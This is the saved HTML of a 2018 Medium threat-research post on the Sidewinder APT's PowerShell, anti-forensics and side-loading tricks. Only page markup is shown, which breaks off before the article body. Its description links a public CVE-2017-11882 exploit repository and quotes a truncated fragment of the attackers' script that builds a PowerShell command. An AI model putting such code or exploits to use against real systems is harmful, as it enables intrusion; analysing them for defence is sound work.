<!doctype html><html lang="en"><head><title data-rh="true">APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading | by Sebdraven | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2018-07-17T14:57:10.410Z"/><meta data-rh="true" name="title" content="APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading | by Sebdraven | Medium"/><meta data-rh="true" property="og:title" content="APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading"/><meta data-rh="true" property="al:android:url" content="medium://p/5bc1a7e7c84c"/><meta data-rh="true" property="al:ios:url" content="medium://p/5bc1a7e7c84c"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="The implementation has many matching with the public exploit: https://github.com/0x09AL/CVE-2017-11882-metasploit tst = getProfile(“0”) &amp; “$c=”””&amp;c&amp;”””;$m=”””&amp;m&amp;”””;”&amp;…"/><meta data-rh="true" property="og:description" content="Spear phishing"/><meta data-rh="true" property="og:url" content="https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"/><meta data-rh="true" property="al:web:url" content="https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1024/1*UNB3nsU-2fey_uCyR0BC4w.png"/><meta data-rh="true" property="article:author" content="https://sebdraven.medium.com"/><meta data-rh="true" name="author" content="Sebdraven"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/5bc1a7e7c84c"/><meta data-rh="true" property="twitter:description" content="Spear phishing"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1024/1*UNB3nsU-2fey_uCyR0BC4w.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:creator" content="@Sebdraven"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="7 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://sebdraven.medium.com"/><link data-rh="true" rel="canonical" href="https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/5bc1a7e7c84c"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*UNB3nsU-2fey_uCyR0BC4w.png"],"url":"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","dateCreated":"2018-07-16T21:01:02.686Z","datePublished":"2018-07-16T21:01:02.686Z","dateModified":"2018-07-17T16:36:32.349Z","headline":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","name":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","description":"The implementation has many matching with the public exploit: https:\u002F\u002Fgithub.com\u002F0x09AL\u002FCVE-2017-11882-metasploit tst = getProfile(“0”) & “$c=”””&c&”””;$m=”””&m&”””;”&…","identifier":"5bc1a7e7c84c","author":{"@type":"Person","name":"Sebdraven","url":"https:\u002F\u002Fsebdraven.medium.com"},"creator":["Sebdraven"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fsebdraven.medium.com\u002F","logo":{"@type":"ImageObject","width":272,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:544\u002F7*V1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"}</script><style type="text/css" data-fela-rehydration="565" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="565" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:#1A8917}.es{border-color:#1A8917}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:#1A8917}.ez:disabled:hover{border-color:#1A8917}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-bottom:2px}.ii{flex-wrap:nowrap}.ij{font-size:16px}.ik{line-height:24px}.im{margin:0 8px}.in{display:inline}.io{text-decoration:underline}.ip{flex:0 0 auto}.is{flex-wrap:wrap}.it{padding-left:8px}.iu{padding-right:8px}.jv> *{flex-shrink:0}.jw{overflow-x:scroll}.jx::-webkit-scrollbar{display:none}.jy{scrollbar-width:none}.jz{-ms-overflow-style:none}.ka{width:74px}.kb{flex-direction:row}.kc{z-index:2}.kd{margin-right:4px}.kg{-webkit-user-select:none}.kh{border:0}.ki{fill:rgba(117, 117, 117, 1)}.kl{outline:0}.km{user-select:none}.kn> svg{pointer-events:none}.kw{cursor:progress}.kx{opacity:1}.ky{padding:4px 0}.lb{margin-top:0px}.lc{width:16px}.le{display:inline-flex}.lk{max-width:100%}.ll{padding:8px 2px}.lm svg{color:#6B6B6B}.md{line-height:1.12}.me{letter-spacing:-0.022em}.mf{font-weight:600}.na{margin-bottom:-0.28em}.nb{float:left}.nc{font-size:66px}.nd{line-height:.83}.nj{line-height:1.58}.nk{letter-spacing:-0.004em}.nl{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.og{margin-bottom:-0.46em}.om{margin-left:auto}.on{margin-right:auto}.oo{max-width:1322px}.ou{clear:both}.ow{cursor:zoom-in}.ox{z-index:auto}.oz{height:auto}.pa{max-width:766px}.pb{max-width:733px}.pc{max-width:826px}.pd{box-shadow:inset 3px 0 0 0 #242424}.pe{padding-left:23px}.pf{margin-left:-20px}.pg{font-style:italic}.ph{max-width:989px}.pi{max-width:969px}.pj{list-style-type:disc}.pk{margin-left:30px}.pl{padding-left:0px}.pr{max-width:634px}.px{max-width:1192px}.py{padding-top:5px}.pz{padding-bottom:5px}.qa{max-width:850px}.qb{margin-top:32px}.qc{margin-bottom:14px}.qd{padding-top:24px}.qe{padding-bottom:10px}.qf{background-color:#000000}.qg{height:3px}.qh{width:3px}.qi{margin-right:20px}.qj{max-width:1028px}.qk{max-width:1024px}.qq{box-shadow:inset 0 0 0 1px #F2F2F2}.qr{padding:0px}.qs{padding:16px 20px}.qt{flex:1 1 auto}.qv{overflow:hidden}.qw{max-height:40px}.qx{text-overflow:ellipsis}.qy{display:-webkit-box}.qz{-webkit-line-clamp:2}.ra{-webkit-box-orient:vertical}.rc{margin-top:8px}.rd{margin-top:12px}.re{width:160px}.rf{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*BQtQCP2DxBVQoBT6)}.rg{background-origin:border-box}.rh{background-size:cover}.ri{height:167px}.rj{background-position:50% 50%}.rk{margin-bottom:26px}.rl{margin-top:6px}.rm{margin-right:8px}.rn{padding:8px 16px}.ro{border-radius:100px}.rp{transition:background 300ms ease}.rr{white-space:nowrap}.rs{border-top:none}.rt{margin-bottom:50px}.ru{height:52px}.rv{max-height:52px}.rw{box-sizing:content-box}.rx{position:static}.ry{z-index:1}.sa{max-width:155px}.sg{margin-bottom:64px}.sv{height:64px}.sw{width:64px}.sx{align-self:flex-end}.sy{color:rgba(255, 255, 255, 1)}.sz{fill:rgba(255, 255, 255, 1)}.ta{background:rgba(25, 25, 25, 1)}.tb{border-color:rgba(25, 25, 25, 1)}.te:disabled{opacity:0.1}.tf:disabled:hover{background:rgba(25, 25, 25, 1)}.tg:disabled:hover{border-color:rgba(25, 25, 25, 1)}.tk{padding-right:4px}.tl{font-weight:500}.ty{white-space:pre-wrap}.tz{margin-top:16px}.ua{margin-bottom:54px}.ub{height:0px}.uc{gap:18px}.ud{fill:rgba(61, 61, 61, 1)}.up{border-bottom:solid 1px #E5E5E5}.uq{margin-top:72px}.ur{padding:24px 0}.us{margin-bottom:0px}.ut{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:#156D12}.eu:hover{border-color:#156D12}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.il:hover{text-decoration:underline}.kk:hover{fill:rgba(8, 8, 8, 1)}.kz:hover{fill:#000000}.la:hover p{color:#000000}.ld:hover{color:#000000}.ln:hover svg{color:#000000}.rq:hover{background-color:#F2F2F2}.su:hover{background-color:none}.tc:hover{background:#000000}.td:hover{border-color:#242424}.ue:hover{fill:rgba(25, 25, 25, 1)}.bd:focus-within path{fill:#242424}.kj:focus{fill:rgba(8, 8, 8, 1)}.lo:focus svg{color:#000000}.oy:focus{transform:scale(1.01)}.ko:active{border-style:none}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:50px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.jh{border-top:solid 1px #F2F2F2}.ji{border-bottom:solid 1px #F2F2F2}.jj{margin:32px 0 0}.jk{padding:3px 8px}.jt> *{margin-right:24px}.ju> :last-child{margin-right:0}.kv{margin-top:0px}.lj{margin:0}.mw{font-size:24px}.mx{margin-top:1.95em}.my{line-height:30px}.mz{letter-spacing:-0.016em}.ni{padding-top:7px}.oc{font-size:20px}.od{margin-top:0.94em}.oe{line-height:32px}.of{letter-spacing:-0.003em}.ol{margin-top:2.14em}.ot{margin-top:56px}.pq{margin-top:1.14em}.pw{max-width:1192px}.qp{margin-top:32px}.sf{display:inline-block}.sh{flex-direction:row}.sk{margin-bottom:0}.sl{margin-right:20px}.th{max-width:500px}.tw{line-height:24px}.tx{letter-spacing:0}.uj{margin:40px 0 0}.uo{padding-top:72px}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.ku{margin-top:0px}.se{display:inline-block}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.kt{margin-top:0px}.sd{display:inline-block}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.kr{margin-top:0px}.ks{margin-right:0px}.qu{padding:10px 12px 10px}.sc{display:inline-block}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:2px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.iq{flex-direction:column}.iv{margin:24px -24px 0}.iw{padding:0}.jl> *{margin-right:8px}.jm> :last-child{margin-right:24px}.ke{margin-left:0px}.kp{margin-top:0px}.kq{margin-right:0px}.lf{margin:0}.lp{border:1px solid #F2F2F2}.lq{border-radius:99em}.lr{padding:0px 16px 0px 12px}.ls{height:38px}.lt{align-items:center}.lv svg{margin-right:8px}.mg{font-size:20px}.mh{margin-top:1.2em}.mi{line-height:24px}.mj{letter-spacing:0}.ne{padding-top:0}.nm{font-size:18px}.nn{margin-top:0.67em}.no{line-height:28px}.np{letter-spacing:-0.003em}.oh{margin-top:1.56em}.op{margin-top:40px}.pm{margin-top:1.34em}.ps{max-width:100%}.ql{margin-top:24px}.sb{display:inline-block}.ss{margin-bottom:20px}.st{margin-right:0}.tm{font-size:24px}.tn{line-height:30px}.to{letter-spacing:-0.016em}.uf{margin:32px 0 0}.uk{padding-top:48px}.lu:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:50px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jd{border-top:solid 1px #F2F2F2}.je{border-bottom:solid 1px #F2F2F2}.jf{margin:32px 0 0}.jg{padding:3px 8px}.jr> *{margin-right:24px}.js> :last-child{margin-right:0}.li{margin:0}.ms{font-size:24px}.mt{margin-top:1.95em}.mu{line-height:30px}.mv{letter-spacing:-0.016em}.nh{padding-top:7px}.ny{font-size:20px}.nz{margin-top:0.94em}.oa{line-height:32px}.ob{letter-spacing:-0.003em}.ok{margin-top:2.14em}.os{margin-top:56px}.pp{margin-top:1.14em}.pv{max-width:1192px}.qo{margin-top:32px}.si{flex-direction:row}.sm{margin-bottom:0}.sn{margin-right:20px}.ti{max-width:500px}.tu{line-height:24px}.tv{letter-spacing:0}.ui{margin:40px 0 0}.un{padding-top:72px}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:50px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.iz{border-top:solid 1px #F2F2F2}.ja{border-bottom:solid 1px #F2F2F2}.jb{margin:32px 0 0}.jc{padding:3px 8px}.jp> *{margin-right:24px}.jq> :last-child{margin-right:0}.lh{margin:0}.mo{font-size:24px}.mp{margin-top:1.95em}.mq{line-height:30px}.mr{letter-spacing:-0.016em}.ng{padding-top:7px}.nu{font-size:20px}.nv{margin-top:0.94em}.nw{line-height:32px}.nx{letter-spacing:-0.003em}.oj{margin-top:2.14em}.or{margin-top:56px}.po{margin-top:1.14em}.pu{max-width:100%}.qn{margin-top:32px}.sj{flex-direction:row}.so{margin-bottom:0}.sp{margin-right:20px}.tj{max-width:500px}.ts{line-height:24px}.tt{letter-spacing:0}.uh{margin:40px 0 0}.um{padding-top:72px}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:2px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.ir{flex-direction:column}.ix{margin:24px 0 0}.iy{padding:0}.jn> *{margin-right:8px}.jo> :last-child{margin-right:8px}.kf{margin-left:0px}.lg{margin:0}.lw{border:1px solid #F2F2F2}.lx{border-radius:99em}.ly{padding:0px 16px 0px 12px}.lz{height:38px}.ma{align-items:center}.mc svg{margin-right:8px}.mk{font-size:20px}.ml{margin-top:1.2em}.mm{line-height:24px}.mn{letter-spacing:0}.nf{padding-top:0}.nq{font-size:18px}.nr{margin-top:0.67em}.ns{line-height:28px}.nt{letter-spacing:-0.003em}.oi{margin-top:1.56em}.oq{margin-top:40px}.pn{margin-top:1.34em}.pt{max-width:100%}.qm{margin-top:24px}.sq{margin-bottom:20px}.sr{margin-right:0}.tp{font-size:24px}.tq{line-height:30px}.tr{letter-spacing:-0.016em}.ug{margin:32px 0 0}.ul{padding-top:48px}.mb:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="print">.rz{display:none}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.ov{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style><style type="text/css" data-fela-rehydration="565" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.rb{max-height:none}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F5bc1a7e7c84c&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=---top_nav_layout_nav-----------------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=---top_nav_layout_nav-----------------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 